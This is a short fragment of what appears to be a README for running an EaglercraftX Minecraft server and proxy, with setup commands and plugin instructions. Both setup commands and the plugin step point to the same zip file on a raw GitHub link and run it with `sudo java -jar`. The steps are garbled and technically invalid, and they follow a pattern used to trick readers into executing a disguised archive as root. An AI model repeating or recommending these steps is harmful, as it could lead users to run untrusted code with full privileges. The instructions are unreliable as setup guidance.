...
<br>
<br>
first tab: `cd server && sudo java -jar https://raw.githubusercontent.com/ion1900/EaglercraftX-Server/main/bungee/plugins/EaglercraftXBungee/Server_Eaglercraft_1.1-beta.2.zip`
<br>
<br>
second tab: `cd bungee && sudo java -jar https://raw.githubusercontent.com/ion1900/EaglercraftX-Server/main/bungee/plugins/EaglercraftXBungee/Server_Eaglercraft_1.1-beta.2.zip`
<br>
<br>
...
## Installing Plugins
In order to install plugins, navigate to `server > plugins`. You will need to clone the initial [https://raw.githubusercontent.com/ion1900/EaglercraftX-Server/main/bungee/plugins/EaglercraftXBungee/Server_Eaglercraft_1.1-beta.2.zip] file as well as creating a separate directory in the plugins folder in order to store the additional data. Then just restart the server and the plugin should be running!
